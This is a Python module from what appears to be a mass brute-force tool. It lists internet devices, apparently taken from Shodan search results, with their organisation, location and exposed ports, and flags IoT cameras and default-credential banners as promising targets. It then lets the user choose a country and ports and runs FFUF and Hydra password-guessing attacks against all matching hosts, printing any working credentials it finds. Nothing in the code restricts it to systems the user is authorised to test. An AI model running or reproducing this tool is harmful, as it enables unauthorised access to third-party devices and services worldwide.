"""Attack execution and target selection."""

from service_detector import detect_service_advanced
from wordlist_manager import select_wordlist, show_wordlist_recommendations
from brute_force import attack_web_form_with_results, attack_hydra_service  # Agregar función Hydra
import time  # Agregar si no está

# Eliminar: from web_form_attack import attack_web_forms
# Eliminar: from brute_force import run_bruteforce

def execute_brute_force_flow(targets):
    """Execute the complete brute force flow - EXACTO del original."""
    
    # Show discovered devices
    print("\n" + "="*80)
    print("DISCOVERED DEVICES")
    print("="*80)
    
    for i, target in enumerate(targets, 1):
        print(f"\n[DEVICE {i}]")
        print(f"IP: {target['ip_str']}")
        print(f"Port: {target['port']}")
        print(f"Protocol: {target.get('transport', 'tcp').upper()}")
        print(f"Service: {target.get('product', 'Unknown')}")
        
        if target.get('version'):
            print(f"Version: {target['version']}")
        
        # Organization and ISP info
        if target.get('org'):
            print(f"Organization: {target['org']}")
        if target.get('isp'):
            print(f"ISP: {target['isp']}")
        if target.get('asn'):
            print(f"ASN: {target['asn']}")
        
        # Location info
        location = target.get('location', {})
        if location:
            location_parts = []
            if location.get('city'):
                location_parts.append(location['city'])
            if location.get('country_name'):
                location_parts.append(location['country_name'])
            if location_parts:
                print(f"Location: {', '.join(location_parts)}")
            if location.get('latitude') and location.get('longitude'):
                print(f"Coordinates: {location['latitude']}, {location['longitude']}")
        
        # Hostnames and domains
        if target.get('hostnames'):
            print(f"Hostnames: {', '.join(target['hostnames'])}")
        if target.get('domains'):
            print(f"Domains: {', '.join(target['domains'])}")
        
        # Operating system and device type
        if target.get('os'):
            print(f"OS: {target['os']}")
        if target.get('device_type'):
            print(f"Device Type: {target['device_type']}")
        
        # Web-specific info
        if target.get('title'):
            print(f"Web Title: {target['title']}")
        if target.get('server'):
            print(f"Web Server: {target['server']}")
        
        # Security info (SIMPLIFICADO - solo mostrar si hay vulns)
        if target.get('vulns'):
            vulns = target['vulns']
            if isinstance(vulns, dict) and vulns:
                print(f"Vulnerabilities: {len(vulns)} found")
            elif isinstance(vulns, list) and vulns:
                print(f"Vulnerabilities: {len(vulns)} found")
        
        if target.get('tags'):
            print(f"Tags: {', '.join(target['tags'])}")
        
        # SSL info
        if target.get('ssl'):
            ssl_info = target['ssl']
            if ssl_info.get('cert'):
                print(f"SSL Certificate: Yes")
        
        # Timestamp
        if target.get('timestamp'):
            print(f"Last Seen: {target['timestamp']}")
        
        # Banner analysis (SIMPLIFICADO - solo mostrar banner)
        if target.get('banner'):
            banner = target['banner'].strip()
            if banner:
                print(f"Banner: {banner[:100]}...")

        print("-" * 80)
    
    # SUMMARY SECTION (SIMPLIFICADO)
    print("\n" + "="*80)
    print("SUMMARY REPORT")
    print("="*80)
    
    # Total devices
    print(f"Total devices found: {len(targets)}")
    
    # Breakdown by service/product
    services = {}
    for target in targets:
        service = target.get('product', 'Unknown')
        services[service] = services.get(service, 0) + 1
    
    print(f"\nServices breakdown:")
    for service, count in sorted(services.items(), key=lambda x: x[1], reverse=True):
        print(f"  {service}: {count} devices")
    
    # Breakdown by port
    ports = {}
    for target in targets:
        port = target['port']
        ports[port] = ports.get(port, 0) + 1
    
    print(f"\nPorts breakdown:")
    for port, count in sorted(ports.items(), key=lambda x: x[1], reverse=True):
        print(f"  Port {port}: {count} devices")
    
    # Breakdown by country
    countries = {}
    for target in targets:
        country = target.get('country_name', 'Unknown')
        countries[country] = countries.get(country, 0) + 1
    
    print(f"\nCountries breakdown:")
    for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {country}: {count} devices")
    
    # Organizations breakdown
    orgs = {}
    for target in targets:
        org = target.get('org') or 'Unknown'  # Handle None values
        orgs[org] = orgs.get(org, 0) + 1
    
    print(f"\nTop organizations:")
    for org, count in sorted(orgs.items(), key=lambda x: x[1], reverse=True)[:5]:
        org_name = org[:50] + "..." if len(org) > 50 else org
        print(f"  {org_name}: {count} devices")
    
    # Devices with potential security issues (SIMPLIFICADO)
    risky_devices = []
    for target in targets:
        banner = target.get('banner', '').lower()
        tags = target.get('tags', [])
        
        # Look for basic indicators only
        risk_indicators = []
        if 'default' in banner:
            risk_indicators.append('default in banner')
        if target.get('product') in ['webcam', 'camera', 'dvr']:
            risk_indicators.append('IoT device')
        
        if risk_indicators:
            risky_devices.append((target, risk_indicators))
    
    if risky_devices:
        print(f"\nPotentially vulnerable devices: {len(risky_devices)}")
        for target, indicators in risky_devices[:5]:
            print(f"  {target['ip_str']}:{target['port']} - {', '.join(indicators)}")
        if len(risky_devices) > 5:
            print(f"  ... and {len(risky_devices) - 5} more")
    
    print("="*80)
    
    # BRUTE FORCE SECTION
    bruteforce = input("\nDo you want to run brute-force attacks? (y/n): ")
    if bruteforce.lower() != "y":
        print("Finished.")
        return

    # MOSTRAR recomendaciones de wordlist antes de la selección
    show_wordlist_recommendations(targets)

    # STEP 1: Country selection
    filtered_by_country = select_country(targets)
    if not filtered_by_country:
        print("No devices found in selected country.")
        return

    # STEP 2: Port selection
    filtered_by_port, selected_country, selected_ports = select_ports(filtered_by_country)
    if not filtered_by_port:
        print("No devices found with selected ports.")
        return

    # STEP 3: Wordlist selection
    username_list, password_list, wordlist_name = select_wordlist()

    # STEP 4: Final confirmation and execution
    execute_attacks(filtered_by_port, username_list, password_list, wordlist_name, selected_country, selected_ports)

def select_country(targets):
    """Select target country from available targets."""
    print("\n" + "="*60)
    print("BRUTE FORCE TARGET SELECTION")
    print("="*60)
    
    # Get unique countries
    countries = {}
    for target in targets:
        country = target.get('country_name', 'Unknown')
        countries[country] = countries.get(country, 0) + 1
    
    # Sort countries by device count
    sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)
    
    print("\nStep 1: Select target country")
    print("0. All countries")
    for i, (country, count) in enumerate(sorted_countries, 1):
        print(f"{i}. {country} ({count} devices)")
    
    # Country selection
    while True:
        try:
            country_choice = int(input(f"\nSelect country (0-{len(sorted_countries)}): "))
            if country_choice == 0:
                selected_country = "All countries"
                filtered_by_country = targets
                break
            elif 1 <= country_choice <= len(sorted_countries):
                selected_country = sorted_countries[country_choice - 1][0]
                filtered_by_country = [t for t in targets if t.get('country_name', 'Unknown') == selected_country]
                break
            else:
                print(f"Invalid choice. Please select 0-{len(sorted_countries)}")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    return filtered_by_country

def select_ports(filtered_by_country):
    """Select target ports from filtered devices."""
    print(f"\nStep 2: Select target port")
    
    # Get unique ports from filtered devices
    ports = {}
    for target in filtered_by_country:
        port = target['port']
        ports[port] = ports.get(port, 0) + 1
    
    # Define common ports and categorize
    common_web_ports = [80, 443, 8080, 8443, 8000, 8888]
    common_admin_ports = [21, 22, 23, 2222, 2323]
    common_other_ports = [25, 53, 110, 143, 993, 995, 1433, 3306, 5432]
    
    # Categorize found ports
    web_ports = {port: count for port, count in ports.items() if port in common_web_ports}
    admin_ports = {port: count for port, count in ports.items() if port in common_admin_ports}
    other_ports = {port: count for port, count in ports.items() 
                  if port not in common_web_ports and port not in common_admin_ports}
    
    port_options = []
    option_num = 1
    
    print("0. All ports")
    port_options.append(("all", list(ports.keys())))
    
    # Web ports
    if web_ports:
        print(f"\nWeb Services:")
        for port, count in sorted(web_ports.items()):
            print(f"{option_num}. Port {port} ({count} devices)")
            port_options.append(("single", port))
            option_num += 1
        
        # All web ports option
        print(f"{option_num}. All web ports ({sum(web_ports.values())} devices)")
        port_options.append(("category", list(web_ports.keys())))
        option_num += 1
    
    # Admin/Remote access ports
    if admin_ports:
        print(f"\nAdmin/Remote Access:")
        for port, count in sorted(admin_ports.items()):
            service_name = {21: "FTP", 22: "SSH", 23: "Telnet", 2222: "SSH alt", 2323: "Telnet alt"}.get(port, "Unknown")
            print(f"{option_num}. Port {port} - {service_name} ({count} devices)")
            port_options.append(("single", port))
            option_num += 1
        
        # All admin ports option
        print(f"{option_num}. All admin ports ({sum(admin_ports.values())} devices)")
        port_options.append(("category", list(admin_ports.keys())))
        option_num += 1
    
    # Other ports
    if other_ports:
        print(f"\nOther Services:")
        # Show top 10 other ports
        sorted_other = sorted(other_ports.items(), key=lambda x: x[1], reverse=True)[:10]
        for port, count in sorted_other:
            print(f"{option_num}. Port {port} ({count} devices)")
            port_options.append(("single", port))
            option_num += 1
        
        # All other ports option
        if len(other_ports) > 1:
            print(f"{option_num}. All other ports ({sum(other_ports.values())} devices)")
            port_options.append(("category", list(other_ports.keys())))
            option_num += 1
    
    # Port selection
    while True:
        try:
            port_choice = int(input(f"\nSelect port option (0-{len(port_options)-1}): "))
            if 0 <= port_choice < len(port_options):
                selection_type, selected_ports = port_options[port_choice]
                
                if selection_type == "all":
                    filtered_by_port = filtered_by_country
                    selected_country = filtered_by_country[0].get('country_name', 'Unknown') if filtered_by_country else 'Unknown'
                elif selection_type == "single":
                    selected_ports = [selected_ports]
                    filtered_by_port = [t for t in filtered_by_country if t['port'] in selected_ports]
                    selected_country = filtered_by_country[0].get('country_name', 'Unknown') if filtered_by_country else 'Unknown'
                elif selection_type == "category":
                    filtered_by_port = [t for t in filtered_by_country if t['port'] in selected_ports]
                    selected_country = filtered_by_country[0].get('country_name', 'Unknown') if filtered_by_country else 'Unknown'
                
                break
            else:
                print(f"Invalid choice. Please select 0-{len(port_options)-1}")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    return filtered_by_port, selected_country, selected_ports

def execute_attacks(filtered_by_port, username_list, password_list, wordlist_name, selected_country, selected_ports):
    """Execute brute force attacks - FFUF for POST forms, Hydra for auth services."""
    total_selected = len(filtered_by_port)
    
    print(f"\n{'=' * 60}")
    print("EXECUTING BRUTE FORCE ATTACKS")
    print("=" * 60)
    print(f"🎯 Wordlist: {wordlist_name}")
    print(f"📊 Targets: {total_selected}")
    print(f"🔐 Methods: FFUF (POST forms) + Hydra (Auth services)")
    print(f"📏 Detection: Response size differences + Auth success")
    
    successful_attacks = 0
    successful_credentials = []  # Lista para almacenar credenciales exitosas
    
    for i, target in enumerate(filtered_by_port, 1):
        ip = target['ip_str']
        port = target['port']
        
        print(f"\n[{i}/{total_selected}] {ip}:{port}")
        print(f"  📍 {target.get('country_name', 'Unknown')}")
        
        # Corregir el manejo de org para evitar NoneType error
        org = target.get('org')
        if org:
            org_display = org[:40] if len(org) > 40 else org
        else:
            org_display = 'Unknown'
        print(f"  🏢 {org_display}")
        
        # Detectar servicio (FFUF para formularios POST, Hydra para servicios de auth)
        service = detect_service_advanced(target)
        
        if service and service.startswith('ffuf-post-form:'):
            # FORMULARIO POST - usar FFUF
            parts = service.split(':', 3)
            form_path = parts[1]
            username_field = parts[2] 
            password_field = parts[3]
            
            is_https = port in [443, 8443, 9443]
            
            form_info = {
                'action': f"{'https' if is_https else 'http'}://{ip}:{port}{form_path}",
                'base_url': f"{'https' if is_https else 'http'}://{ip}:{port}",
                'username_field': username_field,
                'password_field': password_field,
                'method': 'post'
            }
            
            # Atacar formulario con FFUF
            success, found_credentials = attack_web_form_with_results(ip, port, form_info, username_list, password_list)
            
            if success:
                successful_attacks += 1
                # Agregar credenciales encontradas
                for cred in found_credentials:
                    successful_credentials.append({
                        'target': f"{ip}:{port}",
                        'url': form_info['action'],
                        'credentials': cred,
                        'country': target.get('country_name', 'Unknown'),
                        'org': org_display,
                        'method': 'FFUF (POST form)'
                    })
                    
        elif service and service.startswith('hydra:'):
            # SERVICIO HYDRA - usar Hydra
            hydra_service = service.split(':', 1)[1]
            
            # Atacar servicio con Hydra
            success, found_credentials = attack_hydra_service(ip, port, hydra_service, username_list, password_list)
            
            if success:
                successful_attacks += 1
                # Agregar credenciales encontradas
                for cred in found_credentials:
                    successful_credentials.append({
                        'target': f"{ip}:{port}",
                        'url': f"{hydra_service}://{ip}:{port}",
                        'credentials': cred,
                        'country': target.get('country_name', 'Unknown'),
                        'org': org_display,
                        'method': f'Hydra ({hydra_service})'
                    })
        else:
            print(f"      ⚠️  No compatible service found - skipping")
        
        # Pausa entre objetivos
        if i < total_selected:
            time.sleep(2)

    # Resumen final
    print(f"\n{'=' * 60}")
    print("BRUTE FORCE ATTACK SUMMARY")
    print("=" * 60)
    print(f"📊 Targets: {total_selected}")
    print(f"✅ Successful: {successful_attacks}")
    print(f"📈 Success rate: {(successful_attacks/total_selected)*100:.1f}%" if total_selected > 0 else "0%")
    print(f"🛠️  Tools used: FFUF (Web forms) + Hydra (Auth services)")
    print(f"📏 Detection methods: Response size filtering")
    
    # Mostrar credenciales exitosas
    if successful_credentials:
        print(f"\n🎉 SUCCESSFUL CREDENTIALS FOUND:")
        print("=" * 60)
        for i, success in enumerate(successful_credentials, 1):
            print(f"{i}. {success['target']} ({success['country']})")
            print(f"   🔗 {success['url']}")
            print(f"   🔑 {success['credentials']}")
            print(f"   🏢 {success['org']}")
            print(f"   🛠️  {success['method']}")  # Mostrar método usado
            if i < len(successful_credentials):
                print()
    else:
        print(f"\n❌ No valid credentials found on any target")